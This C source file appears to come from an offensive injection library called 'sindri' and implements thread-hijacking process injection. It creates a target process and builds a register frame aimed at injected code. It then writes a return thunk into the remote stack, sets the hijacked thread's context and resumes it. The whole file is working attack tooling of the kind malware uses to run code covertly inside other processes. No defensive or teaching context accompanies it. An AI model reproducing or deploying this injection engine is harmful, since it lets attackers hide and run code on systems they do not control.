#include <sindri/injection/hijack/engine.h>
#include <sindri/status/core.h>

snd_status_t snd_inj_hijack_create_target(snd_inj_ctx_t *ctx) {
    SND_CHECK_NULL(ctx, ctx->proc_api, ctx->proc_api->create_process);

    if (ctx->stage != SND_INJ_STAGE_UNINITIALIZED) {
        return SND_ERR_CTX(SND_STATUS_INVALID_STAGE, "Expected %s, got %s",
                           snd_inj_stage_to_string(SND_INJ_STAGE_UNINITIALIZED), snd_inj_stage_to_string(ctx->stage));
    }

    if (!ctx->target_image_path) {
        return SND_ERR_CTX(SND_STATUS_CORRUPTED_STAGE, "Target image path not set.");
    }

    SND_TRY(ctx->proc_api->create_process(ctx->proc_api, ctx->target_image_path, NULL, &ctx->target_process,
                                          &ctx->remote_thread));

    ctx->stage = SND_INJ_STAGE_TARGET_ACQUIRED;
    return SND_OK;
}

snd_status_t snd_inj_hijack_prepare_frame(const SND_THREAD_REGISTERS *live, PVOID entry, ULONG_PTR arg1, ULONG_PTR arg2,
                                          SND_THREAD_REGISTERS *out) {
    SND_CHECK_NULL(live, out, entry);

#if SND_ENTRY_REGISTER_ARGS
    out->ip     = (ULONG_PTR)entry;
    out->sp     = SND_ENTRY_ALIGN_SP(live->sp);
    out->cx     = arg1;
    out->dx     = arg2;
    out->rflags = SND_ENTRY_FLAGS(live->rflags);
    return SND_OK;
#else
    (void)live;
    (void)entry;
    (void)out;
    (void)arg1;
    (void)arg2;
    return SND_ERR(SND_STATUS_ARCH_MISMATCH);
#endif
}

snd_status_t snd_inj_hijack_execute(snd_inj_ctx_t *ctx, PVOID return_thunk, ULONG_PTR arg1, ULONG_PTR arg2) {
    SND_CHECK_NULL(ctx, ctx->proc_api, ctx->proc_api->write_remote);
    SND_CHECK_NULL(ctx->thread_api, ctx->thread_api->get_context, ctx->thread_api->set_context);
    SND_CHECK_NULL(ctx->thread_api->resume_thread);

    if (ctx->stage != SND_INJ_STAGE_PROTECTIONS_SET) {
        return SND_ERR_CTX(SND_STATUS_INVALID_STAGE, "Expected %s, got %s",
                           snd_inj_stage_to_string(SND_INJ_STAGE_PROTECTIONS_SET), snd_inj_stage_to_string(ctx->stage));
    }

    PVOID entry = ctx->remote_entry_point ? ctx->remote_entry_point : ctx->remote_base;
    SND_CHECK_NULL(entry);

    SND_THREAD_REGISTERS live = {0};
    SND_TRY(ctx->thread_api->get_context(ctx->remote_thread, &live));

    SND_THREAD_REGISTERS frame = {0};
    SND_TRY(snd_inj_hijack_prepare_frame(&live, entry, arg1, arg2, &frame));

    if (return_thunk) {
        SIZE_T written = 0;
        SND_TRY(
            ctx->proc_api->write_remote(ctx->target_process, (PVOID)frame.sp, &return_thunk, sizeof(PVOID), &written));
    }

    SND_TRY(ctx->thread_api->set_context(ctx->remote_thread, &frame));
    SND_TRY(ctx->thread_api->resume_thread(ctx->remote_thread));

    ctx->stage = SND_INJ_STAGE_EXECUTED;
    return SND_OK;
}